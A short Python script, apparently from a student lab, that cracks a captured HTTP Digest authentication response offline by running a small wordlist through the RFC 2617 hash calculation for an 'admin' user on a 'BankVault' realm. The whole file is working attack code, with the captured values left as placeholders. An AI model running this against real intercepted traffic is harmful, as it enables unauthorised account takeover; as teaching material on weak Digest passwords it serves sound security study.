import hashlib

# 1. The Captured Data (Student fills this in from tcpdump)
USER = "admin"
REALM = "BankVault"
NONCE = "dcd98b7102dd2f0e8b11d0f600bfb0c093" # From Program.cs
URI = "/vault"
METHOD = "GET"
CNONCE = "..." # Copy from tcpdump (client nonce)
NC = "00000001" # Copy from tcpdump (nonce count)
TARGET_RESPONSE = "..." # The hash you want to crack

# 2. The Dictionary (Common passwords)
wordlist = ["password", "123456", "monkey123", "letmein"]

def md5(s):
    return hashlib.md5(s.encode()).hexdigest()

print(f"[*] Cracking Digest for user: {USER}...")

for password in wordlist:
    # Replicate the Browser's Math
    ha1 = md5(f"{USER}:{REALM}:{password}")
    ha2 = md5(f"{METHOD}:{URI}")
    # RFC 2617 Calculation
    calc_response = md5(f"{ha1}:{NONCE}:{NC}:{CNONCE}:auth:{ha2}")

    if calc_response == TARGET_RESPONSE:
        print(f"[+] PASSWORD FOUND: {password}")
        exit()

print("[-] Password not in list.")
